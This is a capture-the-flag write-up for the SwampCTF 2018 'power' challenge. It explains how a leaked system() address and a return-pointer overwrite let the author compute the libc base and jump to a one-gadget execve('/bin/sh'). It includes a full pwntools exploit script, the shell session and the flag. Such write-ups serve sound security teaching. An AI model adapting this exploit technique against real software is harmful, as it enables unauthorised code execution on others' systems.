### Solved by superkojiman

We're given a binary called power and its corresponding libc.so for this challenge. The binary comes compiled with a bunch of security options enabled:

```
# checksec  power
[*] '/root/work/pwn/power/power'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

Based on that, I assumed that ASLR was probably enabled on the target server as well. 

When we run a binary, an address is leaked to us: 

```
# ./power
Mage: The old books speak of a single Power QWord that grants
      its speaker a direct link to The Source.
Mage: Do you believe in such things? (yes/no): yes
Mage: Show me your conviction to The Source.
      Take this basis [the mage hands you 0x7f761dfe8390]
      and speak the Power QWord: hello
```

If we poke around the disassembly we can see that this is actually the address of `system()` in libc: 

![](/images/2018/swampctf/power/01.png)

After that, it calls `fread()` and writes our input into `rbp+8` which is the saved return pointer: 

![](/images/2018/swampctf/power/02.png)

We can basically control where we want to go. The easy solution is to jump to a one-gadget-rce. To do this we get the offset of `system()` in the provided libc.so and subtract that from the leaked address. This gives us libc's base address. Here's the offset for `system()`: 

```
# readelf -s libc.so.6 | grep  system@@GLIBC_2
  1351: 0000000000045390    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
``` 

Then we find the offset of a one-gadget-rce in libc.so, add that to libc's base address, and return to that address. Here are the possible options for a one-gadget-rce:

```
# one_gadget ./libc.so.6
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Putting it all together gives us the following exploit:

```
#!/usr/bin/env python

from pwn import *

r = remote("chal1.swampctf.com", 1999)

print r.recv()
r.sendline("yes")
d = r.recv()

system_offset = 0x45390

addr =  d.split()[-6][:-1]
print "system():", addr

libc_base = int(addr, 16) - system_offset
print "libc base:", hex(libc_base)

og_offset = 0x45216

og = libc_base + og_offset
print "one-gadget rce:", hex(og)

r.sendline(p64(og))
r.interactive()
```

Executing it gives us a shell on the target and access to the flag:

```
# ./sploit.py
[+] Opening connection to chal1.swampctf.com on port 1999: Done
Mage: The old books speak of a single Power QWord that grants
      its speaker a direct link to The Source.
Mage: Do you believe in such things? (yes/no):
system(): 0x7f8051ece390
libc base: 0x7f8051e89000
one-gadget rce: 0x7f8051ece216
[*] Switching to interactive mode
$ ls
flag
power
$ cat flag
flag{m4g1c_1s_4ll_ar0Und_u5}
$
```
